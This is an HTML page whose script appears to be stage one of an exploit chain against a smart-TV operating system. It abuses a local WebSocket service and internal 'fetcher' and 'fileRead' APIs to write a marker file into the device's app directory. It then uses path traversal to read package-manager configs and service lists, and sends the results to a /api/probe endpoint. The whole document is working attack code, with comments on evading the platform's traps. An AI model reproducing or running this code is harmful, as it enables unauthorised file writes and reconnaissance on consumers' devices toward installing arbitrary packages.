<!doctype html>
<!-- Superwatch-chain stage 1 for 55E7QTUK: fetcher round-trip + a paced
     constants hunt. Serve artifacts from the page's OWN origin (a 404 makes
     the vendor fetch delete the target). One service call per ~1.3 s beat
     (burst-jam trap); text files only (binary-read trap). -->
<html><head><meta charset="utf-8"><title>fetch test</title></head>
<body><pre id="out">fetch test…</pre><script>
(function () {
  "use strict";
  var out = document.getElementById("out");
  var report = { started: new Date().toISOString(), fetcher: {}, reads: {} };
  function save() { try { var x = new XMLHttpRequest(); x.open("POST", "/api/probe", true); x.setRequestHeader("Content-Type", "application/json"); x.send(JSON.stringify(report)); } catch (e) {} }
  function line(t) { out.textContent = out.textContent + "\n" + t; }
  function norm(m) { if (m == null) return ""; if (typeof m === "string") return m; try { return JSON.stringify(m); } catch (e) { return String(m); } }

  var BASE = location.origin + "/pub/";
  var MARK = "/APPS/.alv_phase3_probe";

  function startFetcher() {
    return new Promise(function resolvePromise(res) {
      var done = false; function fin(v) { if (!done) { done = true; res(v); } }
      try {
        var ws = new WebSocket("wss://localhost:9888");
        ws.onopen = function () {
          ws.send(JSON.stringify({ path: "phoenix://service/basic/fetcher", method: "start",
                                   parameters: {}, session: 901, timeout: 10 }));
          setTimeout(function () { try { ws.close(); } catch (e) {} fin("fetcher start sent"); }, 1200);
        };
        ws.onerror = function () { fin("fetcher start: ws error"); };
        setTimeout(function () { fin("fetcher start: timeout"); }, 5000);
      } catch (e) { fin("fetcher start EXC " + e.message); }
    });
  }

  function readFile(path) {
    try {
      var r = vowOS.service.syncExecute("hiutils", { api: "fileRead", args: { mode: 6, path: [path] } });
      var okc = r && r.ret === true;
      return { ok: okc, body: okc ? norm(r.msg).slice(0, 4000) : null,
               err: okc ? null : norm(r.msg).slice(0, 160) };
    } catch (e) { return { ok: false, err: "EXC " + e }; }
  }

  setTimeout(function () {
    startFetcher().then(function (s0) {
      report.fetcher.start = s0; line(s0);
      setTimeout(function () {
        var args = JSON.stringify({ url: BASE + "marker.txt", directory: MARK, permission: 420 });
        var r;
        try { r = vowOS.service.syncExecute("basic/fetcher", { api: "fetchFile", args: args }); }
        catch (e) { report.fetcher.call = "EXC " + e.message; }
        report.fetcher.call = r ? { ret: r.ret, msg: norm(r.msg).slice(0, 200) } : null;
        line("fetchFile: " + JSON.stringify(report.fetcher.call));
        setTimeout(function () {
          report.fetcher.readback = readFile(MARK);
          line("readback: " + (report.fetcher.readback.ok ? report.fetcher.readback.body : report.fetcher.readback.err));

          // paced constants hunt (install command id + opkg conf location)
          var CANDS = [
            "pkgs/tv.vidaa.jsservice.basic/CHA/pkgmgr/PackageInstall.js",
            "pkgs/tv.vidaa.jsservice.basic/CHA/pkgmgr/PackageInstall.js.js",
            "../APPS/pkgs/tv.vidaa.jsservice.basic/CHA/serviceList.json",
            "../etc/opkg.conf",
            "../usr/local/etc/opkg/apps.conf",
            "../etc/opkg/apps.conf"
          ];
          var ci = 0;
          (function next() {
            if (ci >= CANDS.length) { save(); out.textContent += out.textContent.indexOf("[reported]") === -1 ? "\n[reported]" : ""; return; }
            var p = CANDS[ci], rr = readFile(p);
            report.reads[p] = rr;
            line(p.slice(0, 60) + ": " + (rr.ok ? "OK " + (rr.body || "").length + "b" : "absent"));
            ci++;
            setTimeout(next, 1300);
          })();
        }, 1300);
      }, 1300);
    });
  }, 300);
})();
</script></body></html>
